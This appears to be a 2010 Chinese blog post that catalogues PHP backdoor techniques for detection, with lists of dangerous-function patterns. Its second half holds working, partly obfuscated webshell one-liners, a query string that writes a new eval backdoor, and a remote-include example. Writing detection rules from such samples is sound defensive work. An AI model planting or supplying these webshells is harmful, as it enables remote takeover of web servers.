php部分后门方式和检测
2010-11-26 15:09 (分类:默认分类)
hyq同学说“功能即缺陷”，应该会有很多类型的后门存在方式，对php不熟悉，这里只统计了部分方式，欢迎路过的各位补充其他模式。
如果要做检测的话，总结了下，基本上有三种检测方式：
靠谱函数执行不靠谱内容
不靠谱函数执行不靠谱内容
不靠谱的外部引用
 
 
 
不靠谱函数执行不靠谱内容
 
范例
<?PHP eval($_POST[w]);?>
容错模式
<?PHP @eval($_POST[w]);?>
危险函数
 `` eval|assert|proc_open|popen|shell_exec|exec|passthru|system|
动态执行不靠谱内容造成后门
嫌疑函数
Fwrite| file_put_contents| fputs |
运行时吐出一句话后门
未知函数
create_function|$a() |不靠谱()
不靠谱来源生成的函数
 
引用不靠谱内容
范例：
<?PHP include 'xxoo.jpg' ;?>
引用关键字：
(include|require)(?:_once)?)
用户输入不靠谱来源：
_GET, _POST, _REQUEST, _COOKIE, _SESSION, _SERVER, _ENV, _FILE
隐蔽式函数来源
 base64_decode|$a()| 其他拼凑手段
 
 
对应这几种模式的一些例子（没做整理）：
 
<?PHP @$_POST[e]($_POST[c])?>
 
<?PHP @$_GET[f]($_GET[w]);exit;?>
 
<?php
$payload='e'.'v'.'a'.'l'.'('.'$'.'_'.'G'.'E'.'T'.'['.'\''.'c'.'m'.'d'.'\''.']'.')'.';';
$f=create_function('',$payload);
$f();
?>
<?PHP
$b=explode("^",getenv('QUERY_STRING'));
$b[0]($b[1], $b[2]);
?>
 
<?php
$b=explode("^",getenv('QUERY_STRING'));
$b[0]($b[1], $b[2]);
?>
test.php?file_put_contents^a.php^<?php%20eval($_POST[cmd]);?>
 
<?php
array_map($_GET['cmd'], array(0,1));
?>
 
<?php
import_request_variables("gp","s");$k=$sa('',$sb);$k();
?>
test.php?a=create_function&b=phpinfo();
 
<?php
$arr=get_defined_vars();
$k=$arr["_G"."E"."T"];
$f=$k[a]('',$k[b]);$f();
?>
 
<?php $a=base64_decode('c3lzdGVt');$a($_GET['c']); ?>
 
<?php $f=$_GET[a]('',$_GET[b]);$f(); ?>
 
<?php
$test=$_GET['test'];
@include 'test/'.$test;
?>
test.php?test=../t.txt  http://foo.com/t.txt